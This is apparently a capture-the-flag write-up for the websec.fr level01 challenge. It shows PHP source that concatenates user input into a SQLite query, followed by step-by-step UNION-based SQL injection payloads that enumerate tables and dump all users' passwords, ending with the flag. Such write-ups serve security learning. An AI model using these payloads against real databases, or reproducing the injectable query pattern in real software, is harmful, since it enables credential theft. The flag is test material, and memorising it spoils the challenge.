Link: http://websec.fr/level01/index.php

+ Source code given
```
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL); 

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```
+ When we give the id as 1 or 2 or 3 it gives the username with that id and when we give 4 it doesnt anything as output which means it has only 3 users
+ When we try a basic injection like `1'` it throws an error. 
+ So, to find the number of columns:
  `1 union select 1,2 --` gave the output as `id: 1 username: 2` , so we understood that number we gave is given as output in id and username area, we can use this to dump the data.
+ To dump the table names:
  `-1 union SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type = 'table'--`
  output: id = 1, username= users (table name)
+ `-1 UNION SELECT 1,sql from sqlite_master --`
  output: id=1 username=CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
+ To dump the usernames and passwords:
`-1 UNION SELECT 1, GROUP_CONCAT(password) FROM users--`
  It dumped the passwords of all the users and there we got the flag
  output: id=1 username=UnrelatedPassword,ExampleUserPassword,WEBSEC{Simple_SQLite_Injection}
  
  `Flag: WEBSEC{Simple_SQLite_Injection}`
  

